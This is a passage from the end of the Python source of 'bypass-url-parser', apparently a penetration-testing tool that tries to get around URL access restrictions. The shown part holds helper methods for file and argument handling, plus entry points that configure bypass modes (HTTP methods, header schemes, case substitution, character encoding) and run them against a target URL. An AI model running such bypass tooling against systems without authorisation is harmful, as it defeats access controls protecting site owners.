            handler = logging.StreamHandler()
            handler.setFormatter(formatter)
            new_logger.addHandler(handler)

        return new_logger

    @staticmethod
    def get_list_from_generic_arg(argument, arg_name="generic", enc_format="ISO-8859-1", stdin_support=True,
                                  ext_logger=None, debug=False) -> list[str]:
        """ Return list from generic argument.

        Useful when the argument could be a string, a list or a filename

        :param any argument: Argument value. Could be str / str list separated by comma / list / filename
        :param str arg_name: Argument name just for debug message (Optional)
        :param str enc_format: Encoding format to read file if arg is filename. Default (FR) = ISO-8859-1 (Optional)
        :param bool stdin_support: Make this function compatible with stdin '-' standard (default: True) (Optional)
        :param logger ext_logger: Specify your own logger (default: None) (Optional)
        :param bool debug: Show method debug information (default:False, need ext_logger) (Optional)
        :return: List from generic argument
        """
        # STDIN manage (optional)
        if stdin_support and argument == "-":
            if ext_logger and debug:
                ext_logger.debug(f"Read {arg_name} argument as a list from stdin")
            return sys.stdin.read().splitlines()
        # Arg value is already a list, useful for library mode. Just return
        if isinstance(argument, list):
            if ext_logger and debug:
                ext_logger.debug(f"The {arg_name} argument is already a list")
            return argument
        # Arg value is a filename (/path/file)
        elif os.path.isfile(argument):
            if ext_logger and debug:
                ext_logger.debug(f"The {arg_name} argument is a file")
            return [line.rstrip() for line in Tools.load_file_into_memory_list(
                    argument, enc_format=enc_format, clean_filename=False, ext_logger=ext_logger, debug=debug)]
        # Arg value is a simple string
        elif isinstance(argument, str):
            if ext_logger and debug:
                ext_logger.debug(f"The {arg_name} argument is a string")
            return [argument]
        else:
            error_msg = f"The {arg_name} argument type is not supported"
            if ext_logger:
                ext_logger.critical(error_msg)
            raise ValueError(error_msg)

    @staticmethod
    def load_file_into_memory_list(filename, enc_format="ISO-8859-1", clean_filename=False, debug=False,
                                   ext_logger=None) -> list[str]:
        """ Load whole file into a list in memory, using file.readlines()

        Note: Fast for small files, do not use with huge file...

        :param str filename: Fast filename from args example: .\test.txt or "../../test.txt"
        :param str enc_format: Encoding format to read file. Default (FR) = ISO-8859-1 (Optional)
        :param bool clean_filename: Is filename previously cleaned (transform_relative_filename) ? Default (False)
        :param bool debug: Show debug info from "transform_relative_filename" (Optional)
        :param logger ext_logger: Specify your own logger for debug (default: None) (Optional)
        :return: List containing the whole file
        """
        if not clean_filename:
            absolute_filename = os.path.join(os.path.realpath(os.path.dirname(filename)), os.path.basename(filename))
            if ext_logger and debug and absolute_filename != filename:
                ext_logger.debug(f"Filename {filename} modified to {absolute_filename}")
        else:
            absolute_filename = filename
        file = ""
        # Not using with statement, prefer keep control of debug_class
        try:
            file = open(absolute_filename, mode='rt', encoding=enc_format)
            tmp_list = file.readlines()
        except IOError as error:
            error_msg = f"Unable to open {absolute_filename} file: \n{error}"
            if ext_logger:
                ext_logger.critical(error_msg)
            raise error_msg
        except LookupError as error:
            error_msg = f"Unknown file encoding format to read {absolute_filename} file: \n{error}"
            if ext_logger:
                ext_logger.critical(error_msg)
            if file:
                file.close()
            raise error_msg
        else:
            file.close()
            return tmp_list

    @staticmethod
    def is_exist_directory(directory, force_create=False, create_mode=0o760) -> bool:
        res = os.path.isdir(directory)
        if not res and force_create:
            path = Path(directory)
            path.mkdir(mode=create_mode, parents=True, exist_ok=True)
            return True
        return res


def library():
    """ Library utilisation example."""
    # Show all options by Default
    if len(sys.argv) == 1:
        sys.argv.append("-h")
    arguments = docopt(__doc__, version=f"bypass-url-parser {VERSION}")

    # Init Bypasser (Without external logger. In this case, the library set his own logger)
    exporter = Bypasser(verbose=True, debug=False, debug_class=False, ext_logger=None)

    # Set properties
    exporter.threads = 10
    exporter.timeout = 3
    exporter.current_bypass_modes = "http_methods, http_headers_scheme, case_substitution, char_encode"
    exporter.save_level = 0
    bypass_results = exporter.run(arguments.get("--url"), silent_mode=True)
    filter_status_codes = []
    # filter_status_codes = [400, 403, 405]  # Library only

    # Print results
    for url, grouped_items in bypass_results.items():
        print(f"Bypass results for '{url.geturl()}' url:")
        library_output = Bypasser.get_results_from_grouped_items(url, grouped_items, header_line=True,
                                                                 with_filename=False, filter_sc=filter_status_codes)
        print(library_output)


def main():
    # Show all options by Default
    if len(sys.argv) == 1:
        sys.argv.append("-h")
    arguments = docopt(__doc__, version=f"bypass-url-parser {VERSION}")

    # Log level
    coloredlogs.install(logger=logger, level=logging.DEBUG if arguments["--debug"] else logging.INFO)

    # Debug args and config
    if arguments.get("--debug") == 2:
        logger.debug("=== Command line arguments ===")
        for key, val in arguments.items():
            logger.debug(f"{key}: {val}")

    # Init Bypasser object and run curl commands
    exporter = Bypasser(arguments, ext_logger=logger)
    exporter.run()


if __name__ == "__main__":
    main()
    # library()
